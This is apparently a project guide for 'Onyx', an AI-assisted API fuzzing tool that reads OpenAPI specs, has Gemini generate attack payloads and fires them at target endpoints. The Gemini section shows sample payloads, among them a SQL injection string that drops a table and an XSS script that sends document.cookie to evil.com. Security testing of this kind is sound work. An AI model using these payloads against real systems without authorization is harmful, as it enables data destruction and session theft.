# Onyx — Deep Dive Workflow Guide

A complete explanation of how every piece of this project works, from the moment you paste a URL to the final attack result appearing on your dashboard.

---

## Table of Contents

1. [What is Onyx?](#1-what-is-onyx)
2. [What Can I Paste? (OpenAPI / Swagger Explained)](#2-what-can-i-paste-openapi--swagger-explained)
3. [The Full Flow (Step by Step)](#3-the-full-flow-step-by-step)
4. [Docker — What It Is and Why We Need It](#4-docker--what-it-is-and-why-we-need-it)
5. [Redis — The In-Memory Queue Store](#5-redis--the-in-memory-queue-store)
6. [BullMQ — The Job Queue System](#6-bullmq--the-job-queue-system)
7. [Swagger Parser — Reading the API Blueprint](#7-swagger-parser--reading-the-api-blueprint)
8. [Gemini AI — The Payload Brain](#8-gemini-ai--the-payload-brain)
9. [Prisma & PostgreSQL — Logging Everything](#9-prisma--postgresql--logging-everything)
10. [WebSockets — Live Streaming to the Dashboard](#10-websockets--live-streaming-to-the-dashboard)
11. [Architecture Diagram](#11-architecture-diagram)
12. [Startup Commands (Quick Reference)](#12-startup-commands-quick-reference)

---

## 1. What is Onyx?

Onyx is an **AI-powered API vulnerability testing engine**. You give it a link to any API's documentation (called an OpenAPI/Swagger spec), and it:

1. **Reads** every endpoint the API exposes (e.g., `POST /users/login`, `GET /products/{id}`)
2. **Generates** malicious payloads using Google's Gemini AI — things like SQL injection strings, XSS scripts, oversized data, and broken authentication tokens
3. **Fires** those payloads at the API one by one (rate-limited so you don't get blocked)
4. **Streams** the results live to your dashboard — showing which attacks caused errors (500s), which were blocked, and how fast the API responded

Think of it as a **hacker simulation** that tests how secure an API really is.

---

## 2. What Can I Paste? (OpenAPI / Swagger Explained)

### What is an OpenAPI / Swagger spec?

Every modern API has a **machine-readable documentation file** that describes all its endpoints, parameters, request bodies, and response formats. This file is written in a format called **OpenAPI** (formerly called **Swagger**).

It's usually a `.json` or `.yaml` file hosted at a URL like:

- `https://petstore.swagger.io/v2/swagger.json`
- `https://api.example.com/openapi.json`
- `https://api.example.com/docs/swagger.yaml`

### What can you paste?

| ✅ Works                                           | ❌ Does NOT work                                    |
| -------------------------------------------------- | --------------------------------------------------- |
| `https://petstore.swagger.io/v2/swagger.json`      | `https://google.com` (regular website)              |
| `https://petstore3.swagger.io/api/v3/openapi.json` | `https://example.com/api/users` (a single endpoint) |
| `https://httpbin.org/spec.json`                    | `https://github.com/some-repo` (not an API spec)    |
| Any URL that returns a valid OpenAPI/Swagger JSON  | Any URL that returns HTML                           |

### How do you find an API's spec URL?

Most APIs document their spec URL in their docs. Common patterns:

- `/swagger.json`
- `/openapi.json`
- `/api-docs`
- `/v2/api-docs`
- `/docs/openapi.yaml`

### Sample URLs to test with

```
https://petstore.swagger.io/v2/swagger.json
https://petstore3.swagger.io/api/v3/openapi.json
https://httpbin.org/spec.json
```

---

## 3. The Full Flow (Step by Step)

Here's exactly what happens from the moment you click **"Initiate Scan"**:

```
YOU (Browser)                           ONYX SERVER                         EXTERNAL
─────────────                           ───────────                         ────────
   │                                        │                                  │
   │  1. Paste URL, click button            │                                  │
   │──────────────────────────────────────►  │                                  │
   │        POST /api/test-runs             │                                  │
   │        { specUrl: "https://..." }      │                                  │
   │                                        │                                  │
   │                                        │  2. Fetch the OpenAPI spec       │
   │                                        │─────────────────────────────────►│
   │                                        │     GET https://petstore/v2/...  │
   │                                        │◄─────────────────────────────────│
   │                                        │     (returns JSON spec)          │
   │                                        │                                  │
   │                                        │  3. Parse spec → extract endpoints
   │                                        │     POST /pet, GET /pet/{id}...  │
   │                                        │                                  │
   │                                        │  4. For EACH endpoint:           │
   │                                        │     → Send to Gemini AI          │
   │                                        │     → "Generate 20 malicious     │
   │                                        │        payloads for POST /pet"   │
   │                                        │     → Gemini returns JSON array  │
   │                                        │                                  │
   │                                        │  5. Queue all payloads in BullMQ │
   │                                        │     (stored in Redis)            │
   │                                        │                                  │
   │  6. WebSocket subscription             │                                  │
   │◄─────────────────────────────────────  │                                  │
   │     "SUBSCRIBE to test run XYZ"        │                                  │
   │                                        │                                  │
   │                                        │  7. Worker picks jobs from queue │
   │                                        │     → Fires payload at target API│
   │                                        │─────────────────────────────────►│
   │                                        │     POST /pet with SQLi payload  │
   │                                        │◄─────────────────────────────────│
   │                                        │     Response: 500 / 200 / 403    │
   │                                        │                                  │
   │  8. Live result streamed via WS        │                                  │
   │◄─────────────────────────────────────  │                                  │
   │     { statusCode: 500, method: "POST", │                                  │
   │       endpoint: "/pet", payload: "...",│                                  │
   │       responseTime: 142 }              │                                  │
   │                                        │                                  │
   │  9. Dashboard updates in real-time     │                                  │
   │     (table row appears, counters       │                                  │
   │      update, status changes)           │                                  │
```

---

## 4. Docker — What It Is and Why We Need It

### What is Docker?

Docker is a tool that runs **lightweight virtual machines** (called _containers_) on your computer. Think of it like this:

> Instead of installing Redis on your Mac directly (which requires configuration, might conflict with other software, and is annoying to uninstall), Docker downloads a tiny pre-built "box" that already has Redis perfectly configured inside it.

### Why do we need Docker for Onyx?

Onyx needs **Redis** (an in-memory database). Instead of making you install Redis natively on your Mac, we use Docker to run it:

```bash
docker compose up redis -d
```

This one command:

1. Downloads the `redis:7-alpine` image (a tiny Linux + Redis bundle, ~30MB)
2. Creates a container named `onyx-redis`
3. Starts Redis on port `6379`
4. Runs it in the background (`-d` = detached)

### Docker commands you'll use

| Command                      | What it does           |
| ---------------------------- | ---------------------- |
| `docker compose up redis -d` | Start Redis container  |
| `docker compose down`        | Stop everything        |
| `docker ps`                  | See running containers |
| `docker compose logs redis`  | See Redis logs         |

### Why NOT Docker for PostgreSQL?

We use **Neon** (a cloud PostgreSQL service) instead of a local Docker container because:

- It's always available (no need to start Docker)
- Your data persists even if Docker is restarted
- It's a real production-like database

---

## 5. Redis — The In-Memory Queue Store

### What is Redis?

Redis is an **in-memory data store** — think of it as a super-fast database that keeps everything in RAM instead of on disk. It's used by companies like Twitter, GitHub, and Snapchat for things that need to be blazing fast.

### Why does Onyx need Redis?

Redis is the **backbone of our job queue**. When Onyx generates 200 attack payloads, it doesn't fire them all at once (that would overwhelm the target API and get you rate-limited). Instead:

1. All 200 payloads are **stored as jobs in Redis**
2. The worker picks them up **one at a time**, with a small delay between each
3. If the server crashes, **the jobs survive** in Redis and can be retried

### Redis in Onyx's architecture

```
Gemini AI generates payloads
         │
         ▼
   ┌─────────────┐
   │    Redis     │   ← Jobs stored here as a queue
   │  (port 6379) │   ← "Attack POST /pet with SQLi payload"
   └──────┬──────┘   ← "Attack GET /user with XSS payload"
          │
          ▼
   ┌─────────────┐
   │   Worker     │   ← Picks up one job at a time
   │  (BullMQ)    │   ← Fires it at the target API
   └─────────────┘   ← Streams result via WebSocket
```

---

## 6. BullMQ — The Job Queue System

### What is BullMQ?

BullMQ is a **Node.js job queue library** built on top of Redis. It manages the "to-do list" of attack payloads.

### Why not just use a for-loop?

You might think: _"Why not just loop through the payloads and fire them?"_ Here's why a queue is better:

| Problem                                                                      | How BullMQ solves it                             |
| ---------------------------------------------------------------------------- | ------------------------------------------------ |
| **Rate limiting** — APIs block you if you send too many requests too fast    | BullMQ adds configurable delays between jobs     |
| **Server crashes** — If your server crashes mid-attack, all progress is lost | Jobs are persisted in Redis and auto-retried     |
| **Concurrency** — Some attacks need to run sequentially, others in parallel  | BullMQ controls how many jobs run simultaneously |
| **Monitoring** — You need to know which payloads succeeded vs failed         | BullMQ tracks job status, retries, and errors    |

### How BullMQ works in Onyx

```
Producer (test-run.controller.ts)
  → Adds jobs to the "chaos-attacks" queue
  → Each job = { method, path, payload, attackType }

Redis
  → Stores all pending jobs

Worker (worker.ts)
  → Picks up jobs one at a time
  → Fires HTTP request to the target API
  → Records status code, latency, response
  → Sends result to WebSocket manager
  → Logs result to PostgreSQL
```

---

## 7. Swagger Parser — Reading the API Blueprint

### What does the parser do?

When you paste a URL like `https://petstore.swagger.io/v2/swagger.json`, the parser:

1. **Fetches** the JSON file from that URL
2. **Validates** that it's a proper OpenAPI spec (not garbage HTML or a 404 page)
3. **Extracts** every endpoint:
    - Method: `GET`, `POST`, `PUT`, `DELETE`
    - Path: `/pet`, `/user/{username}`, `/store/order`
    - Parameters: query params, path params, headers
    - Request body schema: what JSON the endpoint expects

### Example: What the parser extracts from Petstore

```json
[
    {
        "method": "POST",
        "path": "/pet",
        "operationId": "addPet",
        "parameters": [],
        "requestBodySchema": {
            "type": "object",
            "properties": {
                "id": { "type": "integer" },
                "name": { "type": "string" },
                "status": {
                    "type": "string",
                    "enum": ["available", "pending", "sold"]
                }
            }
        }
    },
    {
        "method": "GET",
        "path": "/pet/{petId}",
        "operationId": "getPetById",
        "parameters": [
            {
                "name": "petId",
                "in": "path",
                "required": true,
                "schema": { "type": "integer" }
            }
        ]
    }
]
```

This structured data is then passed to Gemini AI so it can generate **schema-aware** payloads.

---

## 8. Gemini AI — The Payload Brain

### What does Gemini do?

Google's **Gemini 2.5 Flash** is the AI model that generates the malicious payloads. Instead of using a static list of generic attack strings, Gemini creates payloads that are **specifically tailored to each endpoint's schema**.

### The System Prompt

Gemini is instructed to act as a **Senior Penetration Tester with 15+ years of experience**. It's told to:

- Analyze the endpoint's method, path, parameters, and request body schema
- Generate exactly **20 sophisticated payloads** per endpoint
- Cover 10 attack categories: SQLi, NoSQLi, XSS, Broken Auth, Integer Overflow, Path Traversal, SSRF, Type Confusion, Oversized Payloads, Rate Limit Abuse
- Return **strict JSON** — no markdown, no explanations

### Example: What Gemini generates for `POST /pet`

Given the pet schema with `{ id: integer, name: string, status: string }`, Gemini might return:

```json
[
    {
        "payload": {
            "id": "' OR 1=1; DROP TABLE pets; --",
            "name": "test",
            "status": "available"
        },
        "attackType": "SQL_INJECTION",
        "description": "SQLi in integer field — tests if id is concatenated into raw SQL"
    },
    {
        "payload": {
            "id": 1,
            "name": "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
            "status": "available"
        },
        "attackType": "XSS",
        "description": "Stored XSS in name field — tests if output is rendered unescaped"
    },
    {
        "payload": {
            "id": 99999999999999999999,
            "name": "a",
            "status": "available"
        },
        "attackType": "BOUNDARY",
        "description": "Integer overflow beyond MAX_SAFE_INTEGER — tests bigint handling"
    }
]
```

Notice how the payloads **match the schema structure** — they use `id`, `name`, and `status` fields with the right types but malicious values. This is much more effective than generic attack strings.

### What if Gemini fails?

If the API key is missing, the request times out, or Gemini returns invalid JSON, the system **gracefully falls back** to 35 built-in static payloads covering all attack categories. The attack sequence never crashes.

### Where is the API key?

```
server/.env → GEMINI_API_KEY=AIzaSy...
```

---

## 9. Prisma & PostgreSQL — Logging Everything

### What is Prisma?

Prisma is an **ORM** (Object-Relational Mapping) — it lets you interact with the PostgreSQL database using TypeScript instead of writing raw SQL queries.

### What is PostgreSQL (Neon)?

PostgreSQL is the relational database where all test run data is permanently stored. We use **Neon** — a serverless PostgreSQL service in the cloud — so you don't need to run a local database.

### What gets stored?

```
┌──────────────┐     ┌──────────────────┐     ┌──────────────┐
│   TestRun    │────►│ TargetEndpoint   │────►│  AttackLog   │
│              │     │                  │     │              │
│ id           │     │ id               │     │ id           │
│ specUrl      │     │ method (POST)    │     │ method       │
│ status       │     │ path (/pet)      │     │ path         │
│ totalAttacks │     │ requestBody      │     │ payload      │
│ completedAt  │     │ schema           │     │ statusCode   │
└──────────────┘     └──────────────────┘     │ latencyMs    │
                                              │ attackType   │
                                              │ response     │
                                              └──────────────┘
```

Every attack result is logged with the exact payload sent, the HTTP status code returned, and the response time — so you can review everything after the scan completes.

---

## 10. WebSockets — Live Streaming to the Dashboard

### What are WebSockets?

Normal HTTP is **request → response** — the browser asks, the server answers, connection closes. WebSockets are a **persistent bi-directional connection** — the server can push data to the browser at any time without being asked.

### Why does Onyx need WebSockets?

Because attack results come in **one at a time** over several minutes. Without WebSockets, the dashboard would have to keep polling the server ("Any new results? Any new results? Any new results?"). With WebSockets, the server instantly pushes each result to the dashboard as it happens.

### How it works in Onyx

```
Dashboard (React)                     Server (Express + ws)
     │                                     │
     │  1. WS connection opens             │
     │────────────────────────────────────► │
     │                                     │
     │  2. Subscribe to test run           │
     │  { type: "SUBSCRIBE",              │
     │    testRunId: "abc-123" }           │
     │────────────────────────────────────► │
     │                                     │
     │                     Worker finishes attack #1
     │                                     │
     │  3. Server pushes result            │
     │◄──────────────────────────────────── │
     │  { type: "ATTACK_RESULT",          │
     │    data: { statusCode: 500, ... } } │
     │                                     │
     │  Dashboard adds row to table        │
     │  Counters update (Total: 1)         │
     │                                     │
     │                     Worker finishes attack #2
     │                                     │
     │  4. Another result pushed           │
     │◄──────────────────────────────────── │
     │  { statusCode: 200, ... }           │
     │                                     │
     │  ... continues for every attack ... │
```

---

## 11. Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                        YOUR BROWSER                             │
│                                                                 │
│  ┌─────────────┐    ┌──────────────────────────────────────┐   │
│  │ Landing Page │───►│           Dashboard                  │   │
│  │  (paste URL) │    │  • Metric cards (requests, failures) │   │
│  └─────────────┘    │  • Live event stream table           │   │
│                      │  • WebSocket connection indicator    │   │
│                      └────────────┬─────────────────────────┘   │
│                                   │                             │
│                          HTTP + WebSocket                       │
└───────────────────────────────────┼─────────────────────────────┘
                                    │
                          Vite Proxy (dev mode)
                           /api → :3001
                           /ws  → :3001
                                    │
┌───────────────────────────────────┼─────────────────────────────┐
│                          ONYX SERVER (:3001)                    │
│                                                                 │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────┐   │
│  │ Express  │  │ Swagger  │  │ Gemini   │  │  WebSocket   │   │
│  │ Routes   │──│ Parser   │──│ AI 2.5   │  │  Manager     │   │
│  │ /api/*   │  │          │  │ Flash    │  │  (ws)        │   │
│  └────┬─────┘  └──────────┘  └────┬─────┘  └──────┬───────┘   │
│       │                           │                │            │
│       │              ┌────────────▼─────────┐      │            │
│       │              │  BullMQ Producer     │      │            │
│       │              │  (queues payloads)   │      │            │
│       │              └────────────┬─────────┘      │            │
│       │                           │                │            │
│  ┌────▼───────────────────────────▼────────────────▼────────┐  │
│  │                       Redis (:6379)                       │  │
│  │                    (Docker container)                      │  │
│  └────────────────────────────┬──────────────────────────────┘  │
│                               │                                 │
│              ┌────────────────▼─────────────┐                   │
│              │     BullMQ Worker            │                   │
│              │  • Picks job from queue      │                   │
│              │  • Fires HTTP at target API  │──────► Target API │
│              │  • Logs result to Postgres   │                   │
│              │  • Pushes result via WS      │                   │
│              └──────────────────────────────┘                   │
│                               │                                 │
│              ┌────────────────▼─────────────┐                   │
│              │    PostgreSQL (Neon Cloud)    │                   │
│              │  • test_runs                 │                   │
│              │  • target_endpoints          │                   │
│              │  • attack_logs               │                   │
│              └──────────────────────────────┘                   │
└─────────────────────────────────────────────────────────────────┘
```

---

## 12. Startup Commands (Quick Reference)

```bash
# Terminal 1 — Start Redis (only needs Docker)
cd /Users/raghular/Desktop/ChaosForge
docker compose up redis -d

# Terminal 2 — Start the backend
cd server
npx prisma db push    # Only needed once, or when schema changes
npm run dev

# Terminal 3 — Start the frontend
cd client
npm run dev

# Open in browser
# → http://localhost:8080
```

### Test with this URL:

```
https://petstore.swagger.io/v2/swagger.json
```

---

> **TL;DR:** You paste an API spec link → Onyx reads every endpoint → Gemini AI crafts 20 smart attack payloads per endpoint → BullMQ queues them in Redis → Worker fires them one by one → Results stream live to your dashboard via WebSocket → Everything is logged in PostgreSQL.
